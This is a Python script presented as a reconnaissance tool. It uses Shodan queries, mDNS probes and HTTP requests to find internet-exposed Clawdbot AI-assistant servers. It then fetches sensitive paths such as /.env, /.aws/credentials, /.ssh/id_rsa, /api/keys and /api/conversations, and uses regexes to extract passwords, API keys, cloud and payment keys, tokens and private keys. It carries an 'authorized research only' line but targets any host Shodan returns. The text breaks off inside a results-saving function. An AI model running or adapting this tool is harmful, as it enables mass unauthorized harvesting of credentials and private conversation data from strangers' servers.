#!/usr/bin/env python3
"""
Clawdbot Comprehensive Reconnaissance Tool v3.0
================================================
Advanced multithreaded Shodan reconnaissance with:
- Parallel target and endpoint probing
- /chat/ validation for Clawdbot confirmation
- mDNS service discovery parsing
- Unlimited result handling
- Deep sensitive file extraction

AUTHORIZATION REQUIRED: Authorized security research only.

Author: Security Research Team
Date: 2026-01-26
"""

import os
import sys
import re
import json
import time
import socket
import argparse
import logging
import signal
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple, Set
from urllib.parse import urljoin
from dataclasses import dataclass, field, asdict
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import queue

try:
    import shodan
except ImportError:
    print("[!] pip install shodan")
    sys.exit(1)

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] pip install requests")
    sys.exit(1)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============================================================================
# Data Classes
# ============================================================================

class ServiceType(Enum):
    GATEWAY = "gateway"
    BRIDGE = "bridge"
    CANVAS = "canvas"
    SSH = "ssh"
    HTTP = "http"
    HTTPS = "https"
    API = "api"
    UNKNOWN = "unknown"


@dataclass
class ClawdbotService:
    ip: str
    port: int
    service_type: ServiceType
    role: Optional[str] = None
    display_name: Optional[str] = None
    lan_host: Optional[str] = None
    tailnet_dns: Optional[str] = None
    cli_path: Optional[str] = None
    transport: Optional[str] = None
    extra_ports: Dict[str, int] = field(default_factory=dict)
    ipv6_addresses: List[str] = field(default_factory=list)
    raw_data: Dict = field(default_factory=dict)
    validated: bool = False


@dataclass
class Finding:
    url: str
    service: ClawdbotService
    path: str
    status_code: int
    content_length: int
    content: str
    headers: Dict[str, str]
    is_sensitive: bool
    sensitive_matches: List[str] = field(default_factory=list)
    content_type: Optional[str] = None
    clawdbot_config: Dict[str, str] = field(default_factory=dict)  # Extracted Clawdbot config


@dataclass 
class TargetResult:
    ip: str
    shodan_data: Dict
    services: List[ClawdbotService]
    findings: List[Finding]
    validated: bool = False
    scan_time: str = field(default_factory=lambda: datetime.now().isoformat())


# ============================================================================
# Configuration
# ============================================================================

# Validation endpoints - check these FIRST to confirm Clawdbot
VALIDATION_ENDPOINTS = [
    "/chat/",
    "/chat",
    "/api/chat",
    "/v1/chat",
    "/",
    "/api/",
    "/api/health",
    "/api/status",
    "/health",
    "/status",
]

# Shodan queries - including clawdbot-gw from Nuclei template
SHODAN_QUERIES = [
    # mDNS service discovery - both gateway and bridge
    'mDNS clawdbot',
    'mDNS "_clawdbot"',
    'mDNS clawdbot-bridge',
    'mDNS clawdbot-gw',  # From Nuclei template!
    'mDNS "_clawdbot-bridge._tcp"',
    'mDNS "_clawdbot-gw._tcp"',  # From Nuclei template!
    
    # HTTP title/content
    'title:"Clawdbot"',
    'http.title:"Clawdbot"',
    'http.html:"Clawdbot"',
    'http.html:"clawdbot-gw"',  # Gateway variant
    
    # Service configuration exposure
    '"gatewayPort" "clawdbot"',
    '"bridgePort" "clawdbot"',
    '"canvasPort" "clawdbot"',
    '"tailnetDns" "clawdbot"',
    '".ts.net" "clawdbot"',
    '"role=gateway"',
    '"displayName" "clawdbot"',  # From Nuclei extractor
    
    # SSL/TLS
    'ssl.cert.subject.cn:"clawdbot"',
    'ssl:"clawdbot"',
    
    # Port-based
    'port:5353 clawdbot',  # mDNS port
]

# mDNS query packets (from Nuclei template analysis)
# Format: DNS query for PTR record of _service._tcp.local
MDNS_QUERIES = {
    'gateway': bytes.fromhex('0000000000010000000000000c5f636c617764626f742d6777045f746370056c6f63616c00000c0001'),
    'bridge': bytes.fromhex('0000000000010000000000000f5f636c617764626f742d627269646765045f746370056c6f63616c00000c0001'),
}

# Clawdbot-specific paths - PRIORITY (these actually exist on Clawdbot servers)
CLAWDBOT_PATHS = [
    # Chat/Config endpoints - PRIORITY (contains embedded config)
    "/chat/",
    "/chat",
    "/config",       # Returns HTML with window.__CLAWDBOT_* config
    "/config/",
    
    # API chat endpoints
    "/api/chat",
    "/api/chat/completions",
    "/v1/chat/completions",
    "/api/v1/chat",
    
    # Clawdbot specific endpoints
    "/api/config",
    "/api/settings", 
    "/api/status",
    "/api/health",
    "/api/info",
    "/api/version",
    "/api/models",
    "/api/keys",
    "/api/users",
    "/api/sessions",
    "/api/history",
    "/api/conversations",
    
    # Gateway/Bridge specific
    "/gateway/config",
    "/gateway/status",
    "/bridge/config", 
    "/bridge/status",
    "/canvas/",
    
    # Internal/Debug
    "/internal/",
    "/internal/config",
    "/internal/debug",
    "/debug/",
    "/debug/config",
    "/metrics",
    "/prometheus",
    "/_health",
    "/_status",
    
    # Admin
    "/admin/",
    "/admin/config",
    "/admin/users",
    "/management/",
    
    # OpenAPI/Docs
    "/docs",
    "/redoc",
    "/swagger",
    "/swagger.json",
    "/openapi.json",
    "/api-docs",
    
    # Root paths
    "/",
    "/api/",
    "/v1/",
]

# Traditional sensitive paths - SECONDARY (less likely on Clawdbot)
SENSITIVE_PATHS_HIGH = [
    # Environment files (most valuable)
    "/.env", "/.env.local", "/.env.production", "/.env.development",
    "/.env.backup", "/.env.old", "/.env.bak",
    "/env", "/env.json",
    
    # Direct secrets
    "/credentials.json", "/secrets.json", "/secrets.yaml",
    "/api_keys.json", "/keys.json", "/tokens.json",
    
    # Cloud creds
    "/.aws/credentials", "/serviceAccountKey.json",
    
    # Private keys
    "/.ssh/id_rsa", "/id_rsa", "/private.key", "/private.pem",
    
    # Git exposure
    "/.git/config", "/.git/HEAD",
    
    # Clawdbot specific files
    "/.clawdbot/config", "/clawdbot.json", "/clawdbot.yaml",
]

SENSITIVE_PATHS_MEDIUM = [
    # Config files
    "/config.json", "/config.yaml", "/config.yml",
    "/settings.json", "/settings.yaml",
    "/application.yml", "/application.properties",
    
    # Database
    "/database.yml", "/db.json", "/datasources.json",
    
    # Docker
    "/docker-compose.yml", "/docker-compose.yaml",
    "/.docker/config.json",
    
    # Backups
    "/backup.sql", "/dump.sql", "/backup.zip",
    
    # Debug endpoints
    "/actuator/env", "/actuator/configprops",
    "/debug", "/debug/vars", "/_debug",
    "/admin", "/admin/config",
    "/internal/config", "/internal/debug",
    
    # API docs (version/structure disclosure)
    "/swagger.json", "/openapi.json", "/api-docs",
    "/graphql", "/graphiql",
]

SENSITIVE_PATHS_LOW = [
    # Package files (dependency disclosure)
    "/package.json", "/composer.json", "/requirements.txt",
    "/Gemfile", "/go.mod", "/Cargo.toml",
    
    # Logs
    "/logs/error.log", "/debug.log", "/app.log",
    
    # More git
    "/.git/logs/HEAD", "/.gitconfig",
    
    # More configs
    "/app.config", "/app.json",
    "/.aws/config", "/firebase.json",
    
    # CI/CD
    "/.github/workflows/", "/.gitlab-ci.yml",
    
    # K8s/Infra
    "/k8s/secrets.yaml", "/helm/values.yaml",
    "/terraform.tfvars",
    
    # Misc
    "/robots.txt", "/sitemap.xml",
    "/phpinfo.php", "/server-status",
]

# Sensitive patterns (compiled for speed)
# Clawdbot-specific patterns - PRIORITY (embedded in HTML responses)
CLAWDBOT_CONFIG_PATTERNS = [
    (re.compile(r'window\.__CLAWDBOT_ASSISTANT_NAME__\s*=\s*["\']([^"\']+)["\']', re.I), 'clawdbot_assistant_name'),
    (re.compile(r'window\.__CLAWDBOT_ASSISTANT_AVATAR__\s*=\s*["\']([^"\']+)["\']', re.I), 'clawdbot_avatar'),
    (re.compile(r'window\.__CLAWDBOT_CONTROL_UI_BASE_PATH__\s*=\s*["\']([^"\']*)["\']', re.I), 'clawdbot_base_path'),
    (re.compile(r'window\.__CLAWDBOT_[A-Z_]+__\s*=\s*["\']?([^"\';<]+)["\']?', re.I), 'clawdbot_config'),
    (re.compile(r'<title>Clawdbot\s*(Control|Chat|Bridge|Gateway)?</title>', re.I), 'clawdbot_title'),
    (re.compile(r'<clawdbot-app>', re.I), 'clawdbot_app_element'),
]

SENSITIVE_PATTERNS = [
    # Clawdbot-specific (check first!)
    *CLAWDBOT_CONFIG_PATTERNS,
    
    # Traditional secrets
    (re.compile(r'password\s*[=:]\s*["\']?[^\s"\']{3,}', re.I), 'password'),
    (re.compile(r'secret\s*[=:]\s*["\']?[^\s"\']{3,}', re.I), 'secret'),
    (re.compile(r'api[_-]?key\s*[=:]\s*["\']?[^\s"\']{8,}', re.I), 'api_key'),
    (re.compile(r'token\s*[=:]\s*["\']?[^\s"\']{8,}', re.I), 'token'),
    (re.compile(r'auth\s*[=:]\s*["\']?[^\s"\']{8,}', re.I), 'auth'),
    (re.compile(r'(mysql|postgres|mongodb|redis)://[^\s"\']+', re.I), 'db_connection'),
    (re.compile(r'AKIA[0-9A-Z]{16}', re.I), 'aws_key'),
    (re.compile(r'aws[_-]?secret[^\s]*[=:]\s*["\']?[^\s"\']{20,}', re.I), 'aws_secret'),
    (re.compile(r'-----BEGIN[^-]*PRIVATE KEY-----', re.I), 'private_key'),
    (re.compile(r'sk_live_[a-zA-Z0-9]{20,}', re.I), 'stripe_live'),
    (re.compile(r'sk_test_[a-zA-Z0-9]{20,}', re.I), 'stripe_test'),
    (re.compile(r'ghp_[a-zA-Z0-9]{36}', re.I), 'github_token'),
    (re.compile(r'gho_[a-zA-Z0-9]{36}', re.I), 'github_oauth'),
    (re.compile(r'Bearer\s+[a-zA-Z0-9\-_\.]{20,}', re.I), 'bearer_token'),
    (re.compile(r'eyJ[a-zA-Z0-9\-_]+\.eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+', re.I), 'jwt'),
]


# ============================================================================
# State Manager - Save/Resume Functionality
# ============================================================================

class StateManager:
    """Manage scan state for save/resume functionality."""
    
    def __init__(self, output_dir: Path):
        self.output_dir = output_dir
        self.state_file = output_dir / "scan_state.json"
        self.targets_file = output_dir / "targets.json"
        
    def save_targets(self, targets: Dict[str, Dict]):
        """Save discovered targets for resume."""
        self.output_dir.mkdir(parents=True, exist_ok=True)
        with open(self.targets_file, 'w') as f:
            json.dump({
                'saved_at': datetime.now().isoformat(),
                'count': len(targets),
                'targets': targets
            }, f, indent=2, default=str)
    
    def load_targets(self) -> Optional[Dict[str, Dict]]:
        """Load previously saved targets."""
        if self.targets_file.exists():
            with open(self.targets_file, 'r') as f:
                data = json.load(f)
                return data.get('targets', {})
        return None
    
    def save_state(self, completed_ips: Set[str], results: List):
        """Save scan progress."""
        state = {
            'saved_at': datetime.now().isoformat(),
            'completed_count': len(completed_ips),
            'completed_ips': list(completed_ips),
            'results_count': len(results),
        }
        with open(self.state_file, 'w') as f:
            json.dump(state, f, indent=2)
    
    def load_state(self) -> Tuple[Set[str], int]:
        """Load scan progress. Returns (completed_ips, results_count)."""
        if self.state_file.exists():
            with open(self.state_file, 'r') as f:
                data = json.load(f)
                return set(data.get('completed_ips', [])), data.get('results_count', 0)
        return set(), 0
    
    def has_saved_state(self) -> bool:
        """Check if there's a saved state to resume from."""
        return self.targets_file.exists()
    
    def get_state_info(self) -> Optional[Dict]:
        """Get info about saved state."""
        if not self.has_saved_state():
            return None
        
        info = {}
        if self.targets_file.exists():
            with open(self.targets_file, 'r') as f:
                data = json.load(f)
                info['targets_saved_at'] = data.get('saved_at')
                info['targets_count'] = data.get('count', 0)
        
        if self.state_file.exists():
            with open(self.state_file, 'r') as f:
                data = json.load(f)
                info['progress_saved_at'] = data.get('saved_at')
                info['completed'] = data.get('completed_count', 0)
        
        return info


# ============================================================================
# Thread-Safe Logger
# ============================================================================

class ThreadSafeLogger:
    def __init__(self, logger: logging.Logger):
        self._logger = logger
        self._lock = Lock()
    
    def info(self, msg):
        with self._lock:
            self._logger.info(msg)
    
    def warning(self, msg):
        with self._lock:
            self._logger.warning(msg)
    
    def error(self, msg):
        with self._lock:
            self._logger.error(msg)
    
    def debug(self, msg):
        with self._lock:
            self._logger.debug(msg)


# ============================================================================
# mDNS Parser
# ============================================================================

class MDNSParser:
    @staticmethod
    def parse_shodan_mdns(banner_data: Dict) -> List[ClawdbotService]:
        services = []
        ip = banner_data.get('ip_str', '')
        
        mdns = banner_data.get('mDNS', {}) or banner_data.get('mdns', {})
        if not mdns:
            raw_data = banner_data.get('data', '')
            if 'clawdbot' in raw_data.lower():
                mdns = MDNSParser._parse_raw_mdns(raw_data)
        
        if not mdns:
            return services
        
        mdns_services = mdns.get('services', {})
        for port_key, service_data in mdns_services.items():
            service = MDNSParser._parse_service_entry(ip, port_key, service_data)
            if service:
                services.append(service)
        
        return services
    
    @staticmethod
    def _parse_service_entry(ip: str, port_key: str, data: Dict) -> Optional[ClawdbotService]:
        if not isinstance(data, dict):
            data = MDNSParser._parse_txt_record(str(data))
        
        port_match = re.match(r'(\d+)(?:/\w+)?', str(port_key))
        port = int(port_match.group(1)) if port_match else 0
        
        service_type = ServiceType.UNKNOWN
        role = data.get('role', '').lower()
        transport = data.get('transport', '').lower()
        
        if 'gateway' in role or 'gateway' in port_key.lower():
            service_type = ServiceType.GATEWAY
        elif 'bridge' in transport or 'bridge' in port_key.lower():
            service_type = ServiceType.BRIDGE
        elif 'canvas' in port_key.lower():
            service_type = ServiceType.CANVAS
        
        extra_ports = {}
        for key in ['gatewayPort', 'bridgePort', 'canvasPort', 'sshPort']:
            if key in data:
                try:
                    extra_ports[key.replace('Port', '')] = int(data[key])
                except (ValueError, TypeError):
                    pass
        
        ipv6_addresses = []
        address_field = data.get('Address', '')
        if address_field:
            for addr in str(address_field).split():
                if ':' in addr and not addr.startswith('fe80'):
                    ipv6_addresses.append(addr)
        
        return ClawdbotService(
            ip=ip,
            port=port,
            service_type=service_type,
            role=data.get('role'),
            display_name=data.get('displayName') or data.get('Name'),
            lan_host=data.get('lanHost'),
            tailnet_dns=data.get('tailnetDns'),
            cli_path=data.get('cliPath'),
            transport=data.get('transport'),
            extra_ports=extra_ports,
            ipv6_addresses=ipv6_addresses,
            raw_data=data
        )
    
    @staticmethod
    def _parse_txt_record(txt: str) -> Dict:
        result = {}
        for match in re.finditer(r'(\w+)=([^\s]+)', txt):
            result[match.group(1)] = match.group(2)
        return result
    
    @staticmethod
    def _parse_raw_mdns(raw_data: str) -> Dict:
        result = {'services': {}}
        if 'clawdbot' in raw_data.lower():
            txt_data = MDNSParser._parse_txt_record(raw_data)
            if txt_data:
                port = txt_data.get('bridgePort') or txt_data.get('gatewayPort') or '0'
                result['services'][f"{port}/tcp clawdbot"] = txt_data
        return result


# ============================================================================
# Active mDNS Prober (from Nuclei template intelligence)
# ============================================================================

class MDNSProber:
    """Active mDNS probing on UDP 5353 - inspired by Nuclei template."""
    
    MDNS_PORT = 5353
    
    # mDNS query packets for Clawdbot services
    QUERIES = {
        'gateway': bytes.fromhex(
            '0000'  # Transaction ID
            '0000'  # Flags (standard query)
            '0001'  # Questions: 1
            '0000'  # Answer RRs
            '0000'  # Authority RRs
            '0000'  # Additional RRs
            '0c'    # Length: 12
            '5f636c617764626f742d6777'  # _clawdbot-gw
            '04'    # Length: 4
            '5f746370'  # _tcp
            '05'    # Length: 5
            '6c6f63616c'  # local
            '00'    # Null terminator
            '000c'  # Type: PTR
            '0001'  # Class: IN
        ),
        'bridge': bytes.fromhex(
            '0000'
            '0000'
            '0001'
            '0000'
            '0000'
            '0000'
            '10'    # Length: 16
            '5f636c617764626f742d627269646765'  # _clawdbot-bridge
            '04'
            '5f746370'
            '05'
            '6c6f63616c'
            '00'
            '000c'
            '0001'
        ),
    }
    
    def __init__(self, logger, timeout: float = 2.0):
        self.logger = logger
        self.timeout = timeout
    
    def probe(self, ip: str) -> Optional[Dict]:
        """
        Send mDNS queries to target and parse response.
        Returns parsed service info if Clawdbot is detected.
        """
        results = {}
        
        for service_type, query_packet in self.QUERIES.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(self.timeout)
                
                # Send mDNS query
                sock.sendto(query_packet, (ip, self.MDNS_PORT))
                
                # Receive response
                try:
                    data, addr = sock.recvfrom(4096)
                    if data:
                        parsed = self._parse_response(data, service_type)
                        if parsed:
                            results[service_type] = parsed
                            self.logger.info(f"  [mDNS] {ip} - {service_type} service detected!")
                except socket.timeout:
                    pass
                finally:
                    sock.close()
                    
            except Exception as e:
                self.logger.debug(f"  [mDNS] {ip} probe error: {e}")
        
        return results if results else None
    
    def _parse_response(self, data: bytes, service_type: str) -> Optional[Dict]:
        """Parse mDNS response and extract Clawdbot configuration."""
        try:
            # Convert to string for pattern matching
            text = data.decode('utf-8', errors='ignore')
            
            # Check for Clawdbot indicators
            if 'clawdbot' not in text.lower():
                return None
            
            result = {
                'service_type': service_type,
                'raw_response': data.hex(),
            }
            
            # Extract key=value pairs from TXT records
            patterns = [
                (r'role=([^\s\x00]+)', 'role'),
                (r'displayName=([^\s\x00]+)', 'display_name'),
                (r'gatewayPort=(\d+)', 'gateway_port'),
                (r'bridgePort=(\d+)', 'bridge_port'),
                (r'canvasPort=(\d+)', 'canvas_port'),
                (r'sshPort=(\d+)', 'ssh_port'),
                (r'tailnetDns=([^\s\x00]+)', 'tailnet_dns'),
                (r'lanHost=([^\s\x00]+)', 'lan_host'),
                (r'cliPath=([^\s\x00]+)', 'cli_path'),
                (r'transport=([^\s\x00]+)', 'transport'),
            ]
            
            for pattern, key in patterns:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    result[key] = match.group(1)
            
            return result
            
        except Exception as e:
            return None
    
    def probe_parallel(self, ips: List[str], max_workers: int = 50) -> Dict[str, Dict]:
        """Probe multiple IPs in parallel."""
        results = {}
        
        self.logger.info(f"[mDNS] Probing {len(ips)} targets on UDP 5353...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.probe, ip): ip for ip in ips}
            
            for future in as_completed(futures):
                ip = futures[future]
                try:
                    result = future.result(timeout=self.timeout + 1)
                    if result:
                        results[ip] = result
                except:
                    pass
        
        self.logger.info(f"[mDNS] Found {len(results)} responsive targets")
        return results


# ============================================================================
# Fast HTTP Client
# ============================================================================

class FastHTTPClient:
    """Thread-safe HTTP client with connection pooling."""
    
    def __init__(self, timeout: int = 5, max_retries: int = 1):
        self.timeout = timeout
        self._local = {}
    
    def _get_session(self) -> requests.Session:
        import threading
        tid = threading.current_thread().ident
        if tid not in self._local:
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*',
                'Connection': 'close',
            })
            session.verify = False
            
            # Fast retry strategy
            retry = Retry(total=1, backoff_factor=0.1, status_forcelist=[500, 502, 503])
            adapter = HTTPAdapter(max_retries=retry, pool_connections=10, pool_maxsize=10)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            
            self._local[tid] = session
        return self._local[tid]
    
    def get(self, url: str, timeout: int = None) -> Optional[requests.Response]:
        try:
            session = self._get_session()
            return session.get(
                url, 
                timeout=timeout or self.timeout,
                allow_redirects=False
            )
        except:
            return None


# ============================================================================
# Multithreaded Prober
# ============================================================================

class MultithreadedProber:
    """High-performance parallel prober."""
    
    def __init__(self, logger: ThreadSafeLogger, timeout: int = 5,
                 max_workers: int = 20, endpoint_workers: int = 10):
        self.logger = logger
        self.timeout = timeout
        self.max_workers = max_workers
        self.endpoint_workers = endpoint_workers
        self.client = FastHTTPClient(timeout=timeout)
        self.stats = {'validated': 0, 'findings': 0, 'sensitive': 0}
        self.stats_lock = Lock()
    
    def validate_clawdbot(self, ip: str, port: int) -> Tuple[bool, Optional[str]]:
        """Quick check if this is actually a Clawdbot instance."""
        for proto in ['http', 'https'] if port in [443, 8443] else ['http']:
            for endpoint in VALIDATION_ENDPOINTS:
                url = f"{proto}://{ip}:{port}{endpoint}"
                try:
                    resp = self.client.get(url, timeout=3)
                    if resp and resp.status_code in [200, 301, 302, 401, 403]:
                        content = resp.text.lower()[:2000]
                        # Check for Clawdbot indicators
                        if any(x in content for x in ['clawdbot', 'claude', 'anthropic', 'chat', 'assistant']):
                            return True, url
                        # Even if no clear indicator, HTTP response on expected port is good
                        if resp.status_code == 200:
                            return True, url
                except:
                    pass
        return False, None
    
    def probe_endpoint(self, url: str, path: str, service: ClawdbotService) -> Optional[Finding]:
        """Probe single endpoint."""
        try:
            resp = self.client.get(url)
            if not resp or resp.status_code != 200 or len(resp.content) < 10:
                return None
            
            content = resp.text
            content_type = resp.headers.get('Content-Type', '')
            
            # Extract Clawdbot config from HTML (even if it looks like a regular HTML page)
            clawdbot_config = self.extract_clawdbot_config(content)
            
            # Check for sensitive patterns
            matches = self._check_sensitive(content)
            
            # Skip HTML error pages unless they have Clawdbot config or secrets
            if '<html' in content.lower()[:500]:
                if not matches and not clawdbot_config:
                    return None
            
            is_sensitive = len(matches) > 0 or len(clawdbot_config) > 0
            
            return Finding(
                url=url,
                service=service,
                path=path,
                status_code=resp.status_code,
                content_length=len(resp.content),
                content=content,
                headers=dict(resp.headers),
                is_sensitive=is_sensitive,
                sensitive_matches=matches,
                content_type=content_type,
                clawdbot_config=clawdbot_config
            )
        except:
            return None
    
    def _check_sensitive(self, content: str) -> List[str]:
        """Check for sensitive patterns."""
        matches = []
        for pattern, name in SENSITIVE_PATTERNS:
            match = pattern.search(content)
            if match:
                # For Clawdbot patterns, include the extracted value
                if 'clawdbot' in name and match.groups():
                    value = match.group(1) if match.lastindex else match.group(0)
                    matches.append(f"{name}:{value}")
                else:
                    matches.append(name)
        return matches
    
    def extract_clawdbot_config(self, content: str) -> Dict[str, str]:
        """Extract all Clawdbot config values from HTML content."""
        config = {}
        for pattern, name in CLAWDBOT_CONFIG_PATTERNS:
            match = pattern.search(content)
            if match:
                value = match.group(1) if match.lastindex else match.group(0)
                config[name] = value
        return config
    
    def probe_service_parallel(self, service: ClawdbotService, 
                               paths: List[str] = None,
                               fast_mode: bool = False) -> List[Finding]:
        """Probe a service with parallel endpoint requests."""
        findings = []
        
        if paths is None:
            if fast_mode:
                # Fast mode: Only Clawdbot-specific paths
                paths = CLAWDBOT_PATHS
            else:
                # Full mode: Clawdbot paths first, then traditional
                paths = CLAWDBOT_PATHS + SENSITIVE_PATHS_HIGH + SENSITIVE_PATHS_MEDIUM + SENSITIVE_PATHS_LOW
        
        # Build URLs
        proto = 'https' if service.port in [443, 8443, 18793] else 'http'
        base_url = f"{proto}://{service.ip}:{service.port}"
        
        endpoints = [(f"{base_url}{path}", path) for path in paths]
        
        # Parallel probe
        with ThreadPoolExecutor(max_workers=self.endpoint_workers) as executor:
            futures = {
                executor.submit(self.probe_endpoint, url, path, service): (url, path)
                for url, path in endpoints
            }
            
            for future in as_completed(futures):
                try:
                    result = future.result(timeout=self.timeout + 2)
                    if result:
                        findings.append(result)
                        with self.stats_lock:
                            self.stats['findings'] += 1
                            if result.is_sensitive:
                                self.stats['sensitive'] += 1
                except:
                    pass
        
        return findings
    
    def process_target(self, ip: str, shodan_data: Dict) -> Optional[TargetResult]:
        """Process a single target - validate then probe."""
        # Parse mDNS services from Shodan passive data
        services = MDNSParser.parse_shodan_mdns(shodan_data)
        
        # Also check for active mDNS probe results
        active_mdns = shodan_data.get('active_mdns', {})
        if active_mdns:
            for svc_type, svc_info in active_mdns.items():
                # Create service from active mDNS discovery
                port = (
                    int(svc_info.get('gateway_port', 0)) or
                    int(svc_info.get('bridge_port', 0)) or
                    shodan_data.get('port', 80)
                )
                
                service_type = ServiceType.GATEWAY if 'gateway' in svc_type else ServiceType.BRIDGE
                
                svc = ClawdbotService(
                    ip=ip,
                    port=port,
                    service_type=service_type,
                    role=svc_info.get('role'),
                    display_name=svc_info.get('display_name'),
                    tailnet_dns=svc_info.get('tailnet_dns'),
                    lan_host=svc_info.get('lan_host'),
                    cli_path=svc_info.get('cli_path'),
                    transport=svc_info.get('transport'),
                    extra_ports={
                        'gateway': int(svc_info.get('gateway_port', 0)) or None,
                        'bridge': int(svc_info.get('bridge_port', 0)) or None,
                        'canvas': int(svc_info.get('canvas_port', 0)) or None,
                        'ssh': int(svc_info.get('ssh_port', 0)) or None,
                    },
                    raw_data=svc_info
                )
                # Filter out None ports
                svc.extra_ports = {k: v for k, v in svc.extra_ports.items() if v}
                services.append(svc)
        
        if not services:
            port = shodan_data.get('port', 80)
            services = [ClawdbotService(
                ip=ip, port=port, service_type=ServiceType.UNKNOWN
            )]
        
        # Collect all ports to probe (including from extra_ports in shodan_data)
        all_ports = set()
        for svc in services:
            all_ports.add(svc.port)
            all_ports.update(svc.extra_ports.values())
        
        # Also add extra ports from raw shodan data
        for port in shodan_data.get('extra_ports', []):
            all_ports.add(port)
        
        validated_services = []
        all_findings = []
        
        # Validate and probe each port
        for port in all_ports:
            is_valid, valid_url = self.validate_clawdbot(ip, port)
            
            if is_valid:
                self.logger.info(f"  [+] VALIDATED: {ip}:{port} via {valid_url}")
                with self.stats_lock:
                    self.stats['validated'] += 1
                
                # Find or create service for this port
                svc = next((s for s in services if s.port == port), None)
                if not svc:
                    svc = ClawdbotService(ip=ip, port=port, service_type=ServiceType.UNKNOWN)
                svc.validated = True
                validated_services.append(svc)
                
                # Full probe on validated services
                findings = self.probe_service_parallel(svc, fast_mode=getattr(self, 'fast_mode', False))
                all_findings.extend(findings)
                
                if findings:
                    sensitive_count = sum(1 for f in findings if f.is_sensitive)
                    self.logger.info(f"      Found {len(findings)} files ({sensitive_count} sensitive)")
            else:
                self.logger.debug(f"  [-] Not validated: {ip}:{port}")
        
        # Also try Tailnet DNS
        for svc in services:
            if svc.tailnet_dns:
                try:
                    tailnet_ip = socket.gethostbyname(svc.tailnet_dns)
                    self.logger.info(f"  [~] Tailnet resolved: {svc.tailnet_dns} -> {tailnet_ip}")
                    
                    is_valid, valid_url = self.validate_clawdbot(tailnet_ip, svc.port)
                    if is_valid:
                        tailnet_svc = ClawdbotService(
                            ip=tailnet_ip, port=svc.port,
                            service_type=svc.service_type,
                            tailnet_dns=svc.tailnet_dns,
                            validated=True
                        )
                        findings = self.probe_service_parallel(tailnet_svc, fast_mode=getattr(self, 'fast_mode', False))
                        all_findings.extend(findings)
                except:
                    pass
        
        if validated_services or all_findings:
            return TargetResult(
                ip=ip,
                shodan_data=shodan_data,
                services=validated_services or services,
                findings=all_findings,
                validated=len(validated_services) > 0
            )
        
        return None
    
    def process_targets_parallel(self, targets: Dict[str, Dict], 
                                  max_workers: int = None,
                                  state_manager = None,
                                  save_interval: int = 10,
                                  results_manager = None) -> List[TargetResult]:
        """Process all targets in parallel with IMMEDIATE finding saves."""
        results = []
        completed_ips = set()
        workers = max_workers or self.max_workers
        total = len(targets)
        
        self.logger.info(f"Processing {total} targets with {workers} workers...")
        
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {
                executor.submit(self.process_target, ip, data): ip
                for ip, data in targets.items()
            }
            
            completed = 0
            for future in as_completed(futures):
                ip = futures[future]
                completed += 1
                completed_ips.add(ip)
                
                try:
                    result = future.result(timeout=120)
                    if result:
                        results.append(result)
                        self.logger.info(f"[{completed}/{total}] {ip} - {len(result.findings)} findings")
                        
                        # IMMEDIATE SAVE - Save findings right after discovery!
                        if results_manager and result.findings:
                            try:
                                saved_path = results_manager.save_target(result)
                                self.logger.info(f"      [SAVED] {saved_path.name}")
                            except Exception as save_err:
                                self.logger.error(f"      [SAVE FAILED] {ip}: {save_err}")
                    else:
                        self.logger.debug(f"[{completed}/{total}] {ip} - No valid services")
                except Exception as e:
                    self.logger.debug(f"[{completed}/{total}] {ip} - Error: {e}")
                
                # Progress update and state save
                if completed % save_interval == 0:
                    with self.stats_lock:
                        self.logger.info(
                            f"Progress: {completed}/{total} | "
                            f"Validated: {self.stats['validated']} | "
                            f"Findings: {self.stats['findings']} | "
                            f"Sensitive: {self.stats['sensitive']}"
                        )
                    
                    # Save state for resume
                    if state_manager:
                        state_manager.save_state(completed_ips, results)
                        self.logger.debug(f"State saved: {len(completed_ips)} completed")
        
        # Final state save
        if state_manager:
            state_manager.save_state(completed_ips, results)
            self.logger.info(f"Final state saved: {len(completed_ips)} completed")
        
        return results


# ============================================================================
# Shodan Handler
# ============================================================================

class ShodanHandler:
    def __init__(self, api_key: str, logger: ThreadSafeLogger):
        self.api = shodan.Shodan(api_key)
        self.logger = logger
        self._validate()
    
    def _validate(self):
        try:
            info = self.api.info()
            self.logger.info(f"Shodan API OK. Credits: {info.get('query_credits', 'N/A')}")
        except shodan.APIError as e:
            self.logger.error(f"Shodan API error: {e}")
            raise
    
    def search(self, query: str, limit: int = 0) -> List[Dict]:
        """Search with optional limit (0 = unlimited)."""
        results = []
        try:
            self.logger.info(f"Query: {query}")
            count = 0
            for banner in self.api.search_cursor(query):
                results.append(banner)
                count += 1
                if limit > 0 and count >= limit:
                    break
            self.logger.info(f"  -> {len(results)} results")
        except shodan.APIError as e:
            self.logger.warning(f"Query error: {e}")
        return results
    
    def search_clawdbot(self, limit_per_query: int = 0) -> Dict[str, Dict]:
        """Execute all queries, dedupe by IP. limit_per_query=0 means unlimited."""
        all_results = {}
        
        for query in SHODAN_QUERIES:
            try:
                results = self.search(query, limit=limit_per_query)
                for r in results:
                    ip = r.get('ip_str')
                    if ip:
                        if ip not in all_results:
                            all_results[ip] = r
                        else:
                            # Merge mDNS data
                            if 'mDNS' in r and 'mDNS' not in all_results[ip]:
                                all_results[ip]['mDNS'] = r['mDNS']
                
                time.sleep(1)
            except Exception as e:
                self.logger.warning(f"Query failed: {query} - {e}")
        
        self.logger.info(f"Total unique targets: {len(all_results)}")
        return all_results


# ============================================================================
# Results Manager
# ============================================================================

class ResultsManager:
    def __init__(self, output_dir: Path, logger: ThreadSafeLogger):
        self.output_dir = output_dir
        self.logger = logger
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self._lock = Lock()
    
    def save_target(self, result: TargetResult) -> Path:
        with self._lock:
            safe_ip = result.ip.replace('.', '_').replace(':', '_')
